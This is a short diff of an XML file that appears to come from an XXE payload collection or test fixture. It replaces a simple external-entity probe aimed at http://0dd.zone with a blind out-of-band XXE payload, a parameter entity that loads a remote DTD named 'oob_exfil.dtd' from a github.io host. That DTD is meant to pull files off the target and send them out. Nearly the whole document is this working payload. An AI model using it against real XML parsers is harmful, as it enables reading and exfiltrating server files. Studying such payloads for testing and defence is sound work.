@@ -1,6 +1,5 @@
-<?xml version="1.0" ?>
-<!DOCTYPE r [
-<!ELEMENT r ANY >
-<!ENTITY sp SYSTEM "http://0dd.zone">
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE a [
+   <!ENTITY % asd SYSTEM "https://fkillrra.github.io//oob_exfil.dtd"> 
+   %asd;  
 ]>
-<r>&sp;</r>
